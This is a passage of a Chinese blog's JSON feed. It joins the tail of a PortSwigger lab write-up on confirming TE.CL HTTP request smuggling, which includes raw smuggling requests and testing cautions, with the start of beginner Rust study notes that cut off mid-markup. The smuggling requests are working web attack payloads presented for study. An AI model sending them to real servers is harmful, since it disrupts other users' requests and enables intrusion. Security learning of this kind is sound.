使用差分响应确认 TE.CL 漏洞</h4>\n<p>要确认 TE.CL 漏洞，您将发送如下攻击请求（需要 <code>\\r\\n\\r\\n</code>  在 final 后面加上尾随序列 <code>0</code> ）：</p>\n<pre><code>POST /search HTTP/1.1\nHost: vulnerable-website.com\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 4\nTransfer-Encoding: chunked\n\n7c\nGET /404 HTTP/1.1\nHost: vulnerable-website.com\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 144\n\nx=\n0\n</code></pre>\n<p>如果攻击成功，则 <code>GET /404</code>  后端服务器将从开始将所有内容视为属于接收到的下一个请求。这将导致随后的 “正常” 请求如下所示：</p>\n<pre><code>GET /404 HTTP/1.1\nHost: vulnerable-website.com\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 146\n\nx=\n0\n\nPOST /search HTTP/1.1\nHost: vulnerable-website.com\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 11\n\nq=smuggling\n</code></pre>\n<p>由于此请求现在包含无效的 URL，因此服务器将以状态代码 404 进行响应，指示攻击请求确实确实对其进行了干扰。</p>\n<p>Lab 地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L3JlcXVlc3Qtc211Z2dsaW5nL2ZpbmRpbmcvbGFiLWNvbmZpcm1pbmctdGUtY2wtdmlhLWRpZmZlcmVudGlhbC1yZXNwb25zZXM=\">https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-te-cl-via-differential-responses</span></p>\n<p>构造数据包：</p>\n<pre><code>POST / HTTP/1.1\nHost: acd31fc11fdb90f980e526ce00b800a5.web-security-academy.net\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nConnection: close\nCookie: session=cGzs96HQw7tftthKo6AmNVgZ1wwj7PoH\nUpgrade-Insecure-Requests: 1\nContent-length: 4\nTransfer-Encoding: chunked\n\n5e\nPOST /404 HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 15\n\nx=1\n0\n\n</code></pre>\n<p><img data-src=\"https://image.3001.net/images/20200716/1594912365.png!small\" alt=\"image-20200715112252499\" /></p>\n<h3 id=\"43-注意\"><a class=\"anchor\" href=\"#43-注意\">#</a> 4.3 注意</h3>\n<p>在尝试通过干扰其他请求来确认请求走私漏洞时，应牢记一些重要的注意事项：</p>\n<ul>\n<li>应使用不同的网络连接将 “攻击” 请求和 “正常” 请求发送到服务器。通过同一连接发送两个请求都不会证明该漏洞存在。</li>\n<li>“攻击” 请求和 “正常” 请求应尽可能使用相同的 URL 和参数名称。这是因为许多现代应用程序根据 URL 和参数将前端请求路由到不同的后端服务器。使用相同的 URL 和参数会增加由同一后端服务器处理请求的机会，这对于进行攻击至关重要。</li>\n<li>在测试 “正常” 请求以检测来自 “攻击” 请求的任何干扰时，您正在与应用程序同时接收到的任何其他请求（包括来自其他用户的请求）竞争。您应该在 “攻击” 请求之后立即发送 “正常” 请求。如果应用程序忙，则可能需要执行多次尝试以确认漏洞。</li>\n<li>在某些应用程序中，前端服务器用作负载平衡器，并根据某些负载平衡算法将请求转发到不同的后端系统。如果将您的 “攻击” 和 “正常” 请求转发到不同的后端系统，则攻击将失败。这是为什么您可能需要多次尝试才能确认漏洞的另一个原因。</li>\n<li>如果您的攻击成功干扰了后续请求，但这不是您发送来检测干扰的 “正常” 请求，则意味着另一个应用程序用户受到了您的攻击的影响。如果继续执行测试，可能会对其他用户造成破坏性影响，因此应谨慎行事。</li>\n</ul>\n<h4 id=\"确认是否为走私攻击\"><a class=\"anchor\" href=\"#确认是否为走私攻击\">#</a> 确认是否为走私攻击：</h4>\n<p>用这几种方式都用一遍，如果产生明显的延时就是这个方式的走私攻击</p>\n",
            "tags": []
        },
        {
            "id": "http://odiws.github.io/2025/03/28/rust%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/",
            "url": "http://odiws.github.io/2025/03/28/rust%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/",
            "title": "rust学习笔记",
            "date_published": "2025-03-28T11:58:38.000Z",
            "content_html": "<h2 id=\"rust学习笔记\"><a class=\"anchor\" href=\"#rust学习笔记\">#</a> Rust 学习笔记</h2>\n<h3 id=\"变量声明\"><a class=\"anchor\" href=\"#变量声明\">#</a> 变量声明：</h3>\n<figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">struct</span> <span class=\"token type-definition class-name\">Struct</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    e<span class=\"token punctuation\">:</span><span class=\"token keyword\">i32</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token comment\">// 若不使用变量时，需要在变量名前面写一个下划线，表示该变量不会被使用，这样才不会报错</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token comment\">// let mut _x = 5;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token comment\">// _x = 6;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token comment\">// println!(\"The value of x is: &#123;&#125;\", _x);</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token comment\">//let (a,mut b):(bool,bool)=(true,false);</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token comment\">//println!(\"a is &#123;:?&#125;,b is &#123;:?&#125;\",a,b);</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token comment\">//b=true;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token comment\">//assert_eq!(a,b);// 用于检查两个值是否相等。如果它们不相等，程序会 panic! 并终止运行</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">let</span> <span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token comment\">//_ 代表匹配一个值，但是我们不关心具体的值是什么，因此没有使用一个变量名而是使用了 _</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token punctuation\">[</span>c<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">..</span><span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> _<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token class-name\">Struct</span> <span class=\"token punctuation\">&#123;</span> e<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">..</span> <span class=\"token punctuation\">&#125;</span> <span class=\"token operator\">=</span> <span class=\"token class-name\">Struct</span> <span class=\"token punctuation\">&#123;</span> e<span class=\"token punctuation\">:</span> <span class=\"token number\">5</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"a is &#123;&#125;, b is &#123;&#125;, c is &#123;&#125;, d is &#123;&#125;, e is &#123;&#125;\"</span><span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token macro property\">assert_eq!</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token comment\">// 常量：</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">const</span> <span class=\"token constant\">MAX_POINTS</span><span class=\"token punctuation\">:</span> <span class=\"token keyword\">u32</span> <span class=\"token operator\">=</span> <span class=\"token number\">100_000</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"The value of MAX_POINTS is: &#123;&#125;\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">MAX_POINTS</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">let</span> space <span class=\"token operator\">=</span> <span class=\"token string\">\"    \"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"空格的数量是&#123;&#125;\"</span><span class=\"token punctuation\">,</span> space<span class=\"token punctuation\">.</span><span class=\"token function\">len</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token keyword\">let</span> guess<span class=\"token punctuation\">:</span><span class=\"token keyword\">i32</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"42\"</span><span class=\"token punctuation\">.</span><span class=\"token function\">parse</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">expect</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Not a number!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre> <span class=\"token comment\">//or:let guess = \"42\".parse::&lt;i32>().expect(\"Not a number!\");</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"数值类型\"><a class=\"anchor\" href=\"#数值类型\">#</a> 数值类型：</h3>\n<h4 id=\"整数类型\"><a class=\"anchor\" href=\"#整数类型\">#</a> 整数类型：</h4>\n<p>rust 内置的整数类型</p>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202503282000823.png\" alt=\"image-20250328200043773\" /></p>\n<p>整形字面量可以用下表的形式书写：</p>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202503282000611.png\" alt=\"image-20250328200031377\" /></p>\n<figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">let</span> a<span class=\"token punctuation\">:</span><span class=\"token keyword\">u8</span> <span class=\"token operator\">=</span> <span class=\"token number\">255</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">let</span> b<span class=\"token operator\">=</span> a<span class=\"token punctuation\">.</span><span class=\"token function\">wrapping_add</span><span class=\"token punctuation\">(</span><span class=\"token number\">20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 相当于加法，给溢出了</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&#123;&#125;\"</span><span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//19</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h4 id=\"浮点型\"><a class=\"anchor\" href=\"#浮点型\">#</a> 浮点型：</h4>\n<p>两种：f32 和 f64-- 默认</p>\n<p>由于精度的原因，我们的 0.1+0.2 不会完全等于 0.3（类似于 python）<img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202503282007894.png\" alt=\"image-20250328200743786\" /></p>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202503282008493.png\" alt=\"image-20250328200810396\" /></p>\n<p>我们在 rust 可以用：</p>\n<figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">(</span><span class=\"token number\">0.1_f64</span> <span class=\"token operator\">+</span> <span class=\"token number\">0.2</span> <span class=\"token operator\">-</span> <span class=\"token number\">0.3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">abs</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">0.00001</span></pre></td></tr></table></figure><p>fn main() {<br />\nlet abc: (f32, f32, f32) = (0.1, 0.2, 0.3);<br />\nlet xyz: (f64, f64, f64) = (0.1, 0.2, 0.3);</p>\n<figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"abc (f32)\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"   0.1 + 0.2: &#123;:x&#125;\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>abc<span class=\"token number\">.0</span> <span class=\"token operator\">+</span> abc<span class=\"token number\">.1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">to_bits</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"         0.3: &#123;:x&#125;\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>abc<span class=\"token number\">.2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">to_bits</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"xyz (f64)\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"   0.1 + 0.2: &#123;:x&#125;\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>xyz<span class=\"token number\">.0</span> <span class=\"token operator\">+</span> xyz<span class=\"token number\">.1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">to_bits</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"         0.3: &#123;:x&#125;\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>xyz<span class=\"token number\">.2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">to_bits</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token macro property\">assert!</span><span class=\"token punctuation\">(</span>abc<span class=\"token number\">.0</span> <span class=\"token operator\">+</span> abc<span class=\"token number\">.1</span> <span class=\"token operator\">==</span> abc<span class=\"token number\">.2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token macro property\">assert!</span><span class=\"token punctuation\">(</span>xyz<span class=\"token number\">.0</span> <span class=\"token operator\">+</span> xyz<span class=\"token number\">.1</span> <span class=\"token operator\">==</span> xyz<span class=\"token number\">.2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>结果：</p>\n<pre><code>abc (f32)\n   0.1 + 0.2: 3e99999a\n         0.3: 3e99999a\n\nxyz (f64)\n   0.1 + 0.2: 3fd3333333333334\n         0.3: 3fd3333333333333\n\n\nthread 'main' panicked at main.rs:16:5:\nassertion failed: xyz.0 + xyz.1 == xyz.2\nnote: run with `RUST_BACKTRACE=1` environment variable to display a backtrace\n</code></pre>\n<p>对  <code>f32</code>  类型做加法时， <code>0.1 + 0.2</code>  的结果是  <code>3e99999a</code> ， <code>0.3</code>  也是  <code>3e99999a</code> ，因此  <code>f32</code>  下的  <code>0.1 + 0.2 == 0.3</code>  通过测试，但是到了  <code>f64</code>  类型时，结果就不一样了，因为  <code>f64</code>  精度高很多，因此在小数点非常后面发生了一点微小的变化， <code>0.1 + 0.2</code>  以  <code>4</code>  结尾，但是  <code>0.3</code>  以 <code>3</code>  结尾，这个细微区别导致  <code>f64</code>  下的测试失败了，并且抛出了异常。</p>\n<h4 id=\"运算\"><a class=\"anchor\" href=\"#运算\">#</a> 运算:</h4>\n<p>+-*/ %（求余）</p>\n<h4 id=\"位运算\"><a class=\"anchor\" href=\"#位运算\">#</a> 位运算：</h4>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202503282012293.png\" alt=\"image-20250328201221251\" /></p>\n<figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token comment\">// 无符号 8 位整数，二进制为 00000010</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">let</span> a<span class=\"token punctuation\">:</span> <span class=\"token keyword\">u8</span> <span class=\"token operator\">=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 也可以写 let a: u8 = 0b_0000_0010;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token comment\">// 二进制为 00000011</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">let</span> b<span class=\"token punctuation\">:</span> <span class=\"token keyword\">u8</span> <span class=\"token operator\">=</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token comment\">// &#123;:08b&#125;：左高右低输出二进制 01，不足 8 位则高位补 0</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"a value is        &#123;:08b&#125;\"</span><span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"b value is        &#123;:08b&#125;\"</span><span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"(a &amp; b) value is  &#123;:08b&#125;\"</span><span class=\"token punctuation\">,</span> a <span class=\"token operator\">&amp;</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"(a | b) value is  &#123;:08b&#125;\"</span><span class=\"token punctuation\">,</span> a <span class=\"token operator\">|</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"(a ^ b) value is  &#123;:08b&#125;\"</span><span class=\"token punctuation\">,</span> a <span class=\"token operator\">^</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"(!b) value is     &#123;:08b&#125;\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">!</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"(a &lt;&lt; b) value is &#123;:08b&#125;\"</span><span class=\"token punctuation\">,</span> a <span class=\"token operator\">&lt;&lt;</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"(a >> b) value is &#123;:08b&#125;\"</span><span class=\"token punctuation\">,</span> a <span class=\"token operator\">>></span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token keyword\">let</span> <span class=\"token keyword\">mut</span> a <span class=\"token operator\">=</span> a<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token comment\">// 注意这些计算符除了！之外都可以加上 = 进行赋值 (因为！= 要用来判断不等于)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    a <span class=\"token operator\">&lt;&lt;=</span> b<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"(a &lt;&lt; b) value is &#123;:08b&#125;\"</span><span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>位运算要用 u8，结果：</p>\n<pre><code>a value is        00000010\nb value is        00000011\n(a &amp; b) value is  00000010\n(a | b) value is  00000011\n(a ^ b) value is  00000001\n(!b) value is     11111100\n(a &lt;&lt; b) value is 00010000\n(a &gt;&gt; b) value is 00000000\n(a &lt;&lt; b) value is 00010000\n</code></pre>\n<h4 id=\"序列\"><a class=\"anchor\" href=\"#序列\">#</a> 序列（***）：</h4>\n<p>我们可以用 1..5 这个来生成 1-5 这几个连续数值，包括 5</p>\n<figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token number\">1</span><span class=\"token punctuation\">..=</span><span class=\"token number\">5</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&#123;&#125;\"</span><span class=\"token punctuation\">,</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><pre><code>1\n2\n3\n4\n5\n</code></pre>\n<p>还能用于字符类型，源于他们的连续型（猜测应该是 ascii 的连续性）</p>\n<h4 id=\"as完成类型转换\"><a class=\"anchor\" href=\"#as完成类型转换\">#</a> AS 完成类型转换：</h4>\n<figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>   <span class=\"token keyword\">let</span> a <span class=\"token operator\">=</span> <span class=\"token number\">3.1</span> <span class=\"token keyword\">as</span> <span class=\"token keyword\">i8</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>   <span class=\"token keyword\">let</span> b <span class=\"token operator\">=</span> <span class=\"token number\">100_i8</span> <span class=\"token keyword\">as</span> <span class=\"token keyword\">i32</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>   <span class=\"token keyword\">let</span> c <span class=\"token operator\">=</span> <span class=\"token char\">'a'</span> <span class=\"token keyword\">as</span> <span class=\"token keyword\">u8</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 将字符 'a' 转换为整数，97</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>   <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&#123;&#125;,&#123;&#125;,&#123;&#125;\"</span><span class=\"token punctuation\">,</span>a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">,</span>c<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>有理数和复数：</p>\n<figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">use</span> <span class=\"token namespace\">num<span class=\"token punctuation\">::</span>complex<span class=\"token punctuation\">::</span></span><span class=\"token class-name\">Complex</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre> <span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>   <span class=\"token keyword\">let</span> a <span class=\"token operator\">=</span> <span class=\"token 